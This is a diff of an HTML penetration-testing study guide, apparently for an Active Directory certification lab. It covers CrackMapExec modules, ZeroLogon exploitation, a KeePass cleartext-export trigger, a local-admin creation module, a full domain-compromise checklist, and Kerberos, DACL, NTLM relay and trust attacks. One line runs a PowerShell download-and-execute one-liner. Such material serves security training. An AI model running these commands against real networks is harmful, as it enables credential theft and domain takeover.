+<p>Searches for KeePass database files (.kdbx) on disk and checks for running KeePass processes. A running process is required for the trigger-based export attack.</p>
+<pre><code class="language-bash"># Find KeePass-related files and running processes
 crackmapexec smb [target-ip] -u julio -p '[password]' -M keepass_discover</code></pre>
 
 <h4 id="5-16-2-keepass-trigger">5.16.2 keepass_trigger Module</h4>
 <p>Adds a malicious trigger to KeePass configuration that exports the database in cleartext to a file.</p>
-<pre><code># Check options
+<pre><code class="language-bash"># Check options
 crackmapexec smb [target-ip] -u julio -p '[password]' \
   -M keepass_trigger --options
 
@@ -4694,7 +4718,7 @@ crackmapexec smb [target-ip] -u julio -p '[password]' \
 <p>These modules check for conditions, they do not exploit. Use the suggested GitHub links to exploit confirmed findings.</p>
 
 <h4 id="5-17-1-vuln-table">5.17.1 Supported Vulnerability Checks</h4>
-<table>
+<table class="custom-table">
   <thead>
     <tr><th>Module</th><th>CVE / Name</th><th>Requires Creds</th></tr>
   </thead>
@@ -4709,7 +4733,7 @@ crackmapexec smb [target-ip] -u julio -p '[password]' \
 </table>
 
 <h4 id="5-17-2-vuln-commands">5.17.2 Running Vulnerability Checks</h4>
-<pre><code># ZeroLogon (unauthenticated)
+<pre><code class="language-bash"># ZeroLogon (unauthenticated)
 proxychains4 -q crackmapexec smb [target-ip] -M Zerologon
 
 # PetitPotam (unauthenticated)
@@ -4735,7 +4759,7 @@ proxychains4 -q crackmapexec --verbose smb [target-ip] -u [user] \
   -p '[password]' -M shadowcoerce</code></pre>
 
 <h4 id="5-17-3-zerologon-exploit">5.17.3 Exploiting ZeroLogon</h4>
-<pre><code># Set machine account password to empty string
+<pre><code class="language-bash"># Set machine account password to empty string
 git clone https://github.com/dirkjanm/CVE-2020-1472 -q
 cd CVE-2020-1472/
 proxychains4 -q python3 cve-2020-1472-exploit.py [dc] [target-ip]
@@ -4747,14 +4771,15 @@ proxychains4 -q crackmapexec smb [target-ip] -u '[dc]$' -p '' --ntds</code></pre
 <h3 id="5-18-popular-smb-modules">5.18 Popular SMB Modules Reference</h3>
 
 <h4 id="5-18-1-module-list">5.18.1 Full Module List</h4>
-<pre><code># List all SMB modules
+<p>List all available modules for a protocol and view their configurable options before running them.</p>
+<pre><code class="language-bash"># List all SMB modules
 crackmapexec smb -L
 
 # List module options
 crackmapexec smb [target] -u [user] -p '[password]' -M [module] --options</code></pre>
 
 <h4 id="5-18-2-module-table">5.18.2 Notable SMB Modules</h4>
-<table>
+<table class="custom-table">
   <thead>
     <tr><th>Module</th><th>Purpose</th></tr>
   </thead>
@@ -4803,7 +4828,9 @@ crackmapexec smb [target] -u [user] -p '[password]' -M [module] --options</code>
 <!-- ---------------------------------------------------------- -->
 <h3 id="5-19-ipv6">5.19 IPv6 Support</h3>
 
-<pre><code># Discover IPv6 addresses via get_netconnections
+<p>CME supports IPv6 targets directly. Use the <code>get_netconnections</code> module to discover IPv6 addresses on compromised hosts, then target them for attacks that may bypass IPv4-only security controls.</p>
+
+<pre><code class="language-bash"># Discover IPv6 addresses via get_netconnections
 crackmapexec smb [target-ip] -u robert -p [password].txt \
   -M get_netconnections
 
@@ -4817,7 +4844,7 @@ crackmapexec smb dead:beef::8c8a:5209:5876:537d -u robert \
 <h4 id="5-20-1-module-structure">5.20.1 Module File Structure</h4>
 <p>Custom modules live in <code>./CrackMapExec/cme/modules/</code>. Every module must subclass <code>CMEModule</code> and define class-level attributes plus the relevant hook methods.</p>
 
-<pre><code>#!/usr/bin/env python3
+<pre><code class="language-bash">#!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 class CMEModule:
     name = 'name_module'
@@ -4844,7 +4871,8 @@ class CMEModule:
         context.log.highlight(p)</code></pre>
 
 <h4 id="5-20-2-example-createadmin">5.20.2 Example: createadmin Module</h4>
-<pre><code>#!/usr/bin/env python3
+<p>A practical example that creates a local admin account on compromised hosts. Demonstrates how to define options, validate input, and execute commands through the CME connection object.</p>
+<pre><code class="language-bash">#!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 class CMEModule:
     '''
@@ -4888,7 +4916,7 @@ class CMEModule:
         p = connection.execute(command, True)
         context.log.highlight(p)</code></pre>
 
-<pre><code># Run with defaults
+<pre><code class="language-bash"># Run with defaults
 crackmapexec smb [target-ip] -u julio -p '[password]' -M createadmin
 
 # Run with custom user/pass
@@ -4896,7 +4924,7 @@ crackmapexec smb [target-ip] -u julio -p '[password]' \
   -M createadmin -o USER=htb PASS=Newpassword!</code></pre>
 
 <h4 id="5-20-3-module-hooks">5.20.3 Available Hook Methods</h4>
-<table>
+<table class="custom-table">
   <thead>
     <tr><th>Method</th><th>Triggered When</th></tr>
   </thead>
@@ -4912,12 +4940,13 @@ crackmapexec smb [target-ip] -u julio -p '[password]' \
 <h4 id="5-21-1-cmedb-intro">5.21.1 Database Overview</h4>
 <p>CME automatically persists credentials, hosts, shares, and groups to an SQLite database at <code>~/.cme/workspaces/</code>. Each protocol has its own <code>.db</code> file.</p>
 
-<pre><code># List default workspace databases
+<pre><code class="language-bash"># List default workspace databases
 ls ~/.cme/workspaces/default/
 # ftp.db  ldap.db  mssql.db  rdp.db  smb.db  ssh.db  winrm.db</code></pre>
 
 <h4 id="5-21-2-workspaces">5.21.2 Workspaces</h4>
-<pre><code># Launch cmedb
+<p>Workspaces isolate data between engagements. Create a workspace per client or domain to keep credential, host, and share data separated.</p>
+<pre><code class="language-bash"># Launch cmedb
 cmedb
 # cmedb (default) >
 
@@ -4934,7 +4963,7 @@ cmedb ([domain]) > workspace default
 cmedb (default)(smb) > back</code></pre>
 
 <h4 id="5-21-3-protocol-db">5.21.3 Protocol Databases</h4>
-<table>
+<table class="custom-table">
   <thead>
     <tr><th>Protocol</th><th>Available Commands</th></tr>
   </thead>
@@ -4945,12 +4974,13 @@ cmedb (default)(smb) > back</code></pre>
   </tbody>
 </table>
 
-<pre><code># Enter SMB protocol database
+<pre><code class="language-bash"># Enter SMB protocol database
 cmedb (default) > proto smb
 cmedb (default)(smb) > help</code></pre>
 
 <h4 id="5-21-4-creds">5.21.4 Managing Credentials</h4>
-<pre><code># List all credentials
+<p>The credential store tracks every valid credential discovered during scans. Filter by username or type (plaintext/hash), add entries manually, or reference stored credentials by ID in subsequent CME commands.</p>
+<pre><code class="language-bash"># List all credentials
 cmedb (default)(smb) > creds
 
 # Filter by username
@@ -4970,7 +5000,8 @@ cmedb (default)(smb) > creds remove 45
 crackmapexec smb [target-ip] -id 4 -x whoami</code></pre>
 
 <h4 id="5-21-5-hosts-shares">5.21.5 Hosts &amp; Shares</h4>
-<pre><code># List all discovered hosts
+<p>Query discovered hosts and shares from the database. Export data to CSV for reporting or cross-referencing with other tools.</p>
+<pre><code class="language-bash"># List all discovered hosts
 cmedb (default)(smb) > hosts
 
 # Filter by hostname
@@ -4980,7 +5011,7 @@ cmedb (default)(smb) > hosts ms01
 cmedb (default)(smb) > shares</code></pre>
 
 <h4 id="5-21-6-export">5.21.6 Exporting Data</h4>
-<pre><code># Export credentials to CSV
+<pre><code class="language-bash"># Export credentials to CSV
 cmedb (default)(smb) > export creds detailed detailed_creds.csv
 
 # Export shares
@@ -4992,30 +5023,42 @@ cmedb (default)(smb) > export local_admins detailed detailed_local_admins.csv</c
 <!-- ---------------------------------------------------------- -->
 <h3 id="5-22-methodology">5.22 CME AD Compromise Methodology</h3>
 
-<div class="methodology-block">
-  <h5>Methodology: Full AD Compromise with CrackMapExec</h5>
-  <ul>
-    <li><input type="checkbox" data-id="cape-5-M-6"> <strong>Recon:</strong> Sweep subnet for SMB hosts - <code>crackmapexec smb [target-ip]/24</code></li>
-    <li><input type="checkbox" data-id="cape-5-M-7"> <strong>NULL/Anon session:</strong> Test for unauthenticated SMB access - <code>-u "" -p ""</code></li>
-    <li><input type="checkbox" data-id="cape-5-M-8"> <strong>RID brute:</strong> Enumerate usernames without credentials - <code>--rid-brute</code></li>
-    <li><input type="checkbox" data-id="cape-5-M-9"> <strong>Password policy:</strong> Check lockout threshold before spraying</li>
-    <li><input type="checkbox" data-id="cape-5-M-10"> <strong>Password spray:</strong> One password across all protocols - SMB, WinRM, LDAP, MSSQL</li>
-    <li><input type="checkbox" data-id="cape-5-M-11"> <strong>LDAP enum:</strong> Run user-desc, delegation, password-not-required, gmsa</li>
-    <li><input type="checkbox" data-id="cape-5-M-12"> <strong>ASREPRoast:</strong> <code>--asreproast</code> via LDAP; crack with hashcat -m 18200</li>
-    <li><input type="checkbox" data-id="cape-5-M-13"> <strong>Kerberoast:</strong> <code>--kerberoasting</code> via LDAP; crack with hashcat -m 13100</li>
-    <li><input type="checkbox" data-id="cape-5-M-14"> <strong>GPP:</strong> Run gpp_password and gpp_autologin on DC</li>
-    <li><input type="checkbox" data-id="cape-5-M-15"> <strong>Share spider:</strong> spider_plus on all readable shares; look for credential files</li>
-    <li><input type="checkbox" data-id="cape-5-M-16"> <strong>Hash steal:</strong> Deploy slinky or drop-sc; capture NTLMv2 with Responder</li>
-    <li><input type="checkbox" data-id="cape-5-M-17"> <strong>Relay:</strong> Identify no-signing hosts (<code>--gen-relay-list</code>); relay captured hashes</li>
-    <li><input type="checkbox" data-id="cape-5-M-18"> <strong>Exec:</strong> Run commands (-x/-X) on admin sessions; collect more creds</li>
-    <li><input type="checkbox" data-id="cape-5-M-19"> <strong>Credential dump:</strong> --sam, --lsa, -M lsassy, -M procdump on compromised hosts</li>
-    <li><input type="checkbox" data-id="cape-5-M-20"> <strong>PtH:</strong> Reuse NT hashes with -H across all hosts</li>
-    <li><input type="checkbox" data-id="cape-5-M-21"> <strong>NTDS:</strong> Dump NTDS.dit from DC with --ntds after obtaining DA/DC$ hash</li>
-    <li><input type="checkbox" data-id="cape-5-M-22"> <strong>Vuln scan:</strong> Check zerologon, petitpotam, nopac, dfscoerce, ms17-010</li>
-    <li><input type="checkbox" data-id="cape-5-M-23"> <strong>BloodHound:</strong> Collect with -M bloodhound; mark owned nodes with -M bh_owned</li>
-    <li><input type="checkbox" data-id="cape-5-M-24"> <strong>OPSEC:</strong> Use Kerberos auth (<code>--kerberos</code> / <code>--use-kcache</code>) where possible; use AES keys for least noise</li>
-  </ul>
-</div>
+<h4 id="5-22-methodology-checklist">Methodology</h4>
+<ul class="methodology-checklist">
+  <li><input type="checkbox" data-id="cape-5-22-0"> <strong>Recon:</strong> Sweep subnet for SMB hosts:
+    <pre><code class="language-bash">crackmapexec smb [target-ip]/24</code></pre>
+  </li>
+  <li><input type="checkbox" data-id="cape-5-22-1"> <strong>NULL/Anon session:</strong> Test for unauthenticated SMB access:
+    <pre><code class="language-bash">crackmapexec smb [target-ip] -u "" -p ""</code></pre>
+  </li>
+  <li><input type="checkbox" data-id="cape-5-22-2"> <strong>RID brute:</strong> Enumerate usernames without credentials:
+    <pre><code class="language-bash">crackmapexec smb [target-ip] -u "" -p "" --rid-brute</code></pre>
+  </li>
+  <li><input type="checkbox" data-id="cape-5-22-3"> <strong>Password policy:</strong> Check lockout threshold before spraying</li>
+  <li><input type="checkbox" data-id="cape-5-22-4"> <strong>Password spray:</strong> One password across all protocols (SMB, WinRM, LDAP, MSSQL)</li>
+  <li><input type="checkbox" data-id="cape-5-22-5"> <strong>LDAP enum:</strong> Run user-desc, delegation, password-not-required, gmsa</li>
+  <li><input type="checkbox" data-id="cape-5-22-6"> <strong>ASREPRoast:</strong> Crack with hashcat -m 18200:
+    <pre><code class="language-bash">crackmapexec ldap [target-ip] -u [user] -p '[password]' --asreproast output.txt</code></pre>
+  </li>
+  <li><input type="checkbox" data-id="cape-5-22-7"> <strong>Kerberoast:</strong> Crack with hashcat -m 13100:
+    <pre><code class="language-bash">crackmapexec ldap [target-ip] -u [user] -p '[password]' --kerberoasting output.txt</code></pre>
+  </li>
+  <li><input type="checkbox" data-id="cape-5-22-8"> <strong>GPP:</strong> Run gpp_password and gpp_autologin on DC</li>
+  <li><input type="checkbox" data-id="cape-5-22-9"> <strong>Share spider:</strong> spider_plus on all readable shares; look for credential files</li>
+  <li><input type="checkbox" data-id="cape-5-22-10"> <strong>Hash steal:</strong> Deploy slinky or drop-sc; capture NTLMv2 with Responder</li>
+  <li><input type="checkbox" data-id="cape-5-22-11"> <strong>Relay:</strong> Identify no-signing hosts; relay captured hashes:
+    <pre><code class="language-bash">crackmapexec smb [target-ip]/24 --gen-relay-list nosigning.txt</code></pre>
+  </li>
+  <li><input type="checkbox" data-id="cape-5-22-12"> <strong>Exec:</strong> Run commands (-x/-X) on admin sessions; collect more creds</li>
+  <li><input type="checkbox" data-id="cape-5-22-13"> <strong>Credential dump:</strong> SAM, LSA, lsassy, procdump on compromised hosts</li>
+  <li><input type="checkbox" data-id="cape-5-22-14"> <strong>PtH:</strong> Reuse NT hashes with -H across all hosts</li>
+  <li><input type="checkbox" data-id="cape-5-22-15"> <strong>NTDS:</strong> Dump NTDS.dit from DC after obtaining DA/DC$ hash</li>
+  <li><input type="checkbox" data-id="cape-5-22-16"> <strong>Vuln scan:</strong> Check zerologon, petitpotam, nopac, dfscoerce, ms17-010</li>
+  <li><input type="checkbox" data-id="cape-5-22-17"> <strong>BloodHound:</strong> Collect and mark owned nodes:
+    <pre><code class="language-bash">crackmapexec smb [target-ip] -u [user] -p '[password]' -M bloodhound -o NEWTARGETONLY=true</code></pre>
+  </li>
+  <li><input type="checkbox" data-id="cape-5-22-18"> <strong>OPSEC:</strong> Use Kerberos auth where possible; use AES keys for least noise</li>
+</ul>
 
 <h2 id="cape-kerberos-attacks">6. Kerberos Attacks</h2>
 
@@ -5038,6 +5081,8 @@ cmedb (default)(smb) > export local_admins detailed detailed_local_admins.csv</c
 
 <p><strong>Pre-authentication</strong> (default) requires the client to encrypt the current timestamp with their key as proof of identity. If disabled, the KDC returns a TGT to any requestor for that account - the basis for AS-REPRoasting.</p>
 
+<figure><img src="./img/cape/kerberos-auth-flow.png" alt="Kerberos authentication flow showing AS-REQ, AS-REP, TGS-REQ, TGS-REP, and AP-REQ exchanges with encrypted ticket structures"></figure>
+
 <h3 id="cape-kerberos-attacks-d4e5f6">6.2 Kerberos Attack Overview</h3>
 
 <table class="custom-table">
@@ -5059,6 +5104,8 @@ cmedb (default)(smb) > export local_admins detailed detailed_local_admins.csv</c
 <p><strong>AS-REPRoasting</strong> targets accounts with <code>DONT_REQ_PREAUTH</code> set in their UAC flags. The KDC returns an AS-REP containing a session key encrypted with the user's password - crackable offline. No prior authentication is required.</p>
 
 <p>This attack can also be "targeted": if an attacker has <code>GenericWrite</code> or <code>GenericAll</code> over an account, they can enable <code>DONT_REQ_PREAUTH</code>, roast the account, then disable it.</p>
+
+<figure><img src="./img/cape/kerberos-preauth-flow.png" alt="Kerberos AS-REQ and AS-REP exchange showing pre-authentication with password-derived key encryption"></figure>
 
 <h4 id="cape-kerberos-attacks-j1k2l3">6.3.1 Enumeration from Windows</h4>
 
@@ -5909,6 +5956,8 @@ powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('h
 <p>Within Windows, <strong>tokens</strong> identify the security context of a process or thread, while <strong>security descriptors</strong> contain the security information associated with an object. Access control lists (ACLs) implement access control for system resources by enumerating the entities permitted to access a resource and the modes granted to each.</p>
 
 <p><strong>Discretionary access control (DAC)</strong> controls access based on the requestor's identity. It is discretionary because an entity with access rights can, by its own volition, enable another entity to access a resource. Windows implements this via <strong>Discretionary access control lists (DACLs)</strong>.</p>
+
+<figure><img src="./img/cape/dacl-ace-permissions.png" alt="Active Directory DACL permission entries showing ACEs for users, groups, and inherited permissions"></figure>
 
 <h4 id="cape-dacl-attacks-i-sd001">7.1.1 Security Descriptors</h4>
 
@@ -6792,6 +6841,8 @@ net user &lt;TARGET&gt; &lt;NEWPASS&gt; /domain</code></pre>
 
 <p>Under the <strong>Key Trust</strong> model (introduced in Windows Server 2016), the client's public key is stored directly in <code>msDS-KeyCredentialLink</code> as a serialized Key Credential object containing the creation date, owner DN, Device GUID, and the public key. The DC decrypts pre-authentication data using the raw public key stored in this attribute.</p>
 
+<figure><img src="./img/cape/shadow-credentials-pkinit.png" alt="Shadow Credentials PKINIT flow showing AS-REQ with client private key, public key verification against msDS-KeyCredentialLink, and TGT issuance"></figure>
+
 <h4 id="cape-dacl-attacks-ii-f7a8b9">8.1.2 NTLM Hash via Shadow Credentials (U2U)</h4>
 
 <p>When a client authenticates via PKINIT and needs NTLM for a non-Kerberos service, the NTLM hash is embedded in the PAC inside an encrypted <code>NTLM_SUPPLEMENTAL_CREDENTIAL</code> entity. To decrypt this, the attacker requests a <strong>Kerberos User-to-User (U2U)</strong> service ticket to themselves - the session key used to encrypt the ticket is in the client's own TGT, making it decryptable.</p>
@@ -7646,6 +7697,8 @@ foreach ($event in $events) {
   </tbody>
 </table>
 
+<figure><img src="./img/cape/ntlm-auth-flow.png" alt="NTLM authentication flow between Client, Server, and Domain Controller showing NEGOTIATE, CHALLENGE, AUTHENTICATE messages and NETLOGON pass-through verification"></figure>
+
 <h4 id="cape-ntlm-relay-attacks-msgtypes01">9.1.4 NTLM Message Fields</h4>
 <table class="custom-table">
   <thead><tr><th>Field</th><th>Description</th></tr></thead>
@@ -7711,6 +7764,8 @@ foreach ($event in $events) {
 <p><strong>NTLM relay</strong> (also known as "NTLM reflection") is an <strong>Adversary-in-the-Middle (AiTM)</strong> technique. The adversary relays NTLM messages between a victim client and a target server, establishing an authenticated session as the victim. All NTLM versions are susceptible because the protocol lacks <strong>mutual authentication</strong> - the client cannot verify it is talking to the legitimate server.</p>
 
 <div class="section-insight"><strong>Note</strong>: Microsoft patched the NTLM self-relay attack (CVE/MS08-068) in 2008. On modern systems, a machine cannot relay authentication back to itself.</div>
+
+<figure><img src="./img/cape/ntlm-relay-attack.png" alt="NTLM Relay attack flow showing Client, Adversary, Server, and DC with the adversary intercepting NEGOTIATE, CHALLENGE, and AUTHENTICATE messages to gain an authenticated session"></figure>
 
 <h4 id="cape-ntlm-relay-attacks-phases01">9.2.1 The Three Phases</h4>
 <table class="custom-table">
@@ -8761,6 +8816,8 @@ python3 printerbug.py [domain]/[user]:'[password]'@[target-ip] [target-ip]</code
   </tbody>
 </table>
 
+<figure><img src="./img/cape/pkinit-certificate-auth.png" alt="PKINIT certificate-based Kerberos authentication showing AS-REQ with client private key, certificate chain validation by KDC, and TGT issuance"></figure>
+
 <h4 id="cape-adcs-attacks-fields">10.1.1 Key Certificate Fields</h4>
 
 <table class="custom-table">
@@ -9389,6 +9446,8 @@ Get-ChildItem cert:\LocalMachine\My</code></pre>
   </tbody>
 </table>
 
+<figure><img src="./img/cape/bloodhound-trust-mapping.png" alt="BloodHound trust map showing parent-child and cross-forest domain trust relationships"></figure>
+
 <h4 id="cape-ad-trust-attacks-concepts">11.1.1 Core Trust Concepts</h4>
 
 <table class="custom-table">
@@ -9473,6 +9532,8 @@ Get-DomainTrust -Domain logistics.ad</code></pre>
 <h3 id="cape-ad-trust-attacks-7g8h9i">11.3 Unconstrained Delegation &amp; Printer Bug (Intra-Forest)</h3>
 
 <p><strong>Unconstrained delegation</strong> on a domain controller caches TGTs of every authenticating user. Combined with the <strong>Printer Bug</strong> (MS-RPRN), an attacker on a child DC can force the parent DC to authenticate and steal its TGT - granting child-to-parent domain compromise without a Golden Ticket.</p>
+
+<figure><img src="./img/cape/printer-bug-attack.png" alt="Printer Bug trust attack flow: MS-RPRN coercion forces parent DC to authenticate to child DC, attacker extracts TGT and performs DCSync"></figure>
 
 <h4 id="cape-ad-trust-attacks-printerbug-attack">11.3.1 Attack: SpoolSample + Rubeus</h4>
 
